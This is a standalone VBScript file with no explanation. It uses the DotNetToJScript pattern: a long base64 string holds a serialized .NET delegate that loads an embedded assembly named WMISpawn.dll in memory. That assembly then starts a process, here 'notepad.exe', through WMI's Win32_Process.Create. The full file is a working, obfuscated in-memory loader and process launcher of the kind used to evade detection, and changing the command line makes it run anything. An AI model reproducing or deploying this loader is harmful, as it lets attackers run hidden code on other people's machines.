Sub DebugPrint(s)
End Sub

Sub SetVersion
End Sub

Function Base64ToStream(b)
  Dim enc, length, ba, transform, ms
  Set enc = CreateObject("System.Text.ASCIIEncoding")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
  Set ms = CreateObject("System.IO.MemoryStream")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Sub Run
Dim s, entry_class
s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
s = s & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
s = s & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
s = s & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
s = s & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
s = s & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
s = s & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
s = s & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
s = s & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
s = s & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
s = s & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
s = s & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
s = s & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
s = s & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
s = s & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
s = s & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
s = s & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
s = s & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
s = s & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
s = s & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
s = s & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
s = s & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
s = s & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAnnOYWgAAAAAA"
s = s & "AAAA4AACIQsBMAAACgAAAAYAAAAAAAD2KQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"
s = s & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAApCkA"
s = s & "AE8AAAAAQAAAeAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAGwoAAAcAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"
s = s & "AAAALnRleHQAAAD8CQAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAeAMAAABA"
s = s & "AAAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"
s = s & "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAANgpAAAAAAAASAAAAAIABQAAIQAAbAcAAAMAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDgAACiob"
s = s & "MAQAjAAAAAEAABFyAQAAcHMPAAAKcxAAAAoKch8AAHBzEQAACgtyOwAAcHMRAAAKDCUHBnMSAAAK"
s = s & "DQgGcxIAAApvEwAAChMEEQRyZQAAcBaMFwAAAW8UAAAKCXJ7AABwbxUAAAoTBREFcokAAHADbxQA"
s = s & "AAoRBXKhAABwEQRvFAAACglyewAAcBEFFG8WAAAKJt4DJt4AKgEQAAAAAHcAEYgAAxUAAAFCU0pC"
s = s & "AQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAAA0AgAAI34AAKACAADoAgAAI1N0cmluZ3MA"
s = s & "AAAAiAUAANgAAAAjVVMAYAYAABAAAAAjR1VJRAAAAHAGAAD8AAAAI0Jsb2IAAAAAAAAAAgAAAUcV"
s = s & "AgAJAAAAAPoBMwAWAAABAAAAGAAAAAIAAAACAAAAAQAAABYAAAAOAAAAAQAAAAEAAAACAAAAAACo"
s = s & "AQEAAAAAAAYADgEiAgYAewEiAgYAWwDwAQ8AQgIAAAYAgwDFAQYA8QDFAQYA0gDFAQYAYgHFAQYA"
s = s & "LgHFAQYARwHFAQYAmgDFAQYAbwADAgYATQADAgYAtQDFAQYAzAK+AQoAZQLTAgoAmQHTAgoAkwLT"
s = s & "AgoAwgLTAgoArQLTAgYA1wG+AQoAPQDTAgYAAQC+AQoAUQLTAgAAAAAHAAAAAAABAAEAAQAQAKMC"
s = s & "AAA9AAEAAQBQIAAAAACGGOoBBgABAFggAAAAAIYAigIQAAEAAAABABkACQDqAQEAEQDqAQYAGQDq"
s = s & "AQoAKQDqARAAMQDqARAAOQDqARAAQQDqARAASQDqARAAUQDqARAAWQDqARAAYQDqARUAaQDqARAA"
s = s & "cQDqARAAeQDqAQYAsQDqARAAgQDqAQYAiQDqARAAkQDqASkAkQAuADMAoQC1ATgAmQB2Aj4AmQAh"
s = s & "AEQALgALAGAALgATAGkALgAbAIgALgAjAJEALgArAJ8ALgAzAJ8ALgA7AJ8ALgBDAJEALgBLAKUA"
s = s & "LgBTAJ8ALgBbAJ8ALgBjAL0ALgBrAOcAQwBbAPQAGgAEgAAAAQAAAAAAAAAAAAAAAADhAQAAAgAA"
s = s & "AAAAAAAAAAAATgAQAAAAAAACAAAAAAAAAAAAAABXANMCAAAAAAAAAAAASW50MzIAPE1vZHVsZT4A"
s = s & "bXNjb3JsaWIAY29tbWFuZABJbnZva2VNZXRob2QAQ3JlYXRlSW5zdGFuY2UATWFuYWdlbWVudFNj"
s = s & "b3BlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRl"
s = s & "AEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1i"
s = s & "bHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNz"
s = s & "ZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRl"
s = s & "AEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3Nl"
s = s & "bWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUATWFuYWdl"
s = s & "bWVudFBhdGgAV01JU3Bhd24uZGxsAHNldF9JdGVtAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBF"
s = s & "eGNlcHRpb24AV01JU3Bhd24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1l"
s = s & "LkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2lu"
s = s & "Z01vZGVzAEludm9rZU1ldGhvZE9wdGlvbnMAT2JqZWN0R2V0T3B0aW9ucwBHZXRNZXRob2RQYXJh"
s = s & "bWV0ZXJzAFJ1bkNsYXNzAE1hbmFnZW1lbnRDbGFzcwBUZXN0Q2xhc3MATWFuYWdlbWVudEJhc2VP"
s = s & "YmplY3QATWFuYWdlbWVudE9iamVjdABTeXN0ZW0uTWFuYWdlbWVudAAAAAAAHVwAXAAuAFwAcgBv"
s = s & "AG8AdABcAGMAaQBtAHYAMgAAG1cAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMAAClXAGkAbgAzADIA"
s = s & "XwBQAHIAbwBjAGUAcwBzAFMAdABhAHIAdAB1AHAAABVTAGgAbwB3AFcAaQBuAGQAbwB3AAANQwBy"
s = s & "AGUAYQB0AGUAABdDAG8AbQBtAGEAbgBkAEwAaQBuAGUAADNQAHIAbwBjAGUAcwBzAFMAdABhAHIA"
s = s & "dAB1AHAASQBuAGYAbwByAG0AYQB0AGkAbwBuAAAAAACE4/2o2D8dTbM4ebK5HATvAAQgAQEIAyAA"
s = s & "AQUgAQEREQQgAQEOBCABAQIOBwYSQRJFEkUSSRJNElEJIAMBElkSRRJBBCAAEk0FIAIBDhwFIAES"
s = s & "UQ4JIAMSUQ4SURJhCLd6XFYZNOCJCLA/X38R1Qo6CAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhj"
s = s & "ZXB0aW9uVGhyb3dzAQgBAAIAAAAAAA0BAAhXTUlTcGF3bgAABQEAAAAAFwEAEkNvcHlyaWdodCDC"
s = s & "qSAgMjAxOAAAKQEAJDYxYzNhYzI5LWRkNjAtNGQzYi05MDUyLTk4ODI3MTIzYThlZQAADAEABzEu"
s = s & "MC4wLjAAAAUBAAEAAAAAAAAAAJ5zmFoAAAAAAgAAABwBAACIKAAAiAoAAFJTRFPnzz0YxPQ1SZmC"
s = s & "jELnaTiaAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAzCkAAAAAAAAAAAAA5ikA"
s = s & "AAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAANgpAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3Jl"
s = s & "ZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"
s = s & "AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAHAMAAAAAAAAAAAAAHAM0AAAA"
s = s & "VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"
s = s & "AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"
s = s & "AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBn"
s = s & "AEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0A"
s = s & "ZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA6AAkAAQBG"
s = s & "AGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAVwBNAEkAUwBwAGEAdwBuAAAAAAAwAAgA"
s = s & "AQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA6AA0AAQBJAG4AdABl"
s = s & "AHIAbgBhAGwATgBhAG0AZQAAAFcATQBJAFMAcABhAHcAbgAuAGQAbABsAAAAAABIABIAAQBMAGUA"
s = s & "ZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAx"
s = s & "ADgAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEIADQABAE8A"
s = s & "cgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABXAE0ASQBTAHAAYQB3AG4ALgBkAGwAbAAA"
s = s & "AAAAMgAJAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABXAE0ASQBTAHAAYQB3AG4AAAAAADQA"
s = s & "CAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBB"
s = s & "AHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAD4OQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"
s = s & "bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"
entry_class = "TestClass"
dllPath = "notepad.exe"

Dim fmt, al, d, o
Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add Empty

Set d = fmt.Deserialize_2(Base64ToStream(s))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
o.RunClass dllPath

End Sub

SetVersion
On Error Resume Next
Run
If Err.Number <> 0 Then
  DebugPrint Err.Description
  Err.Clear
End If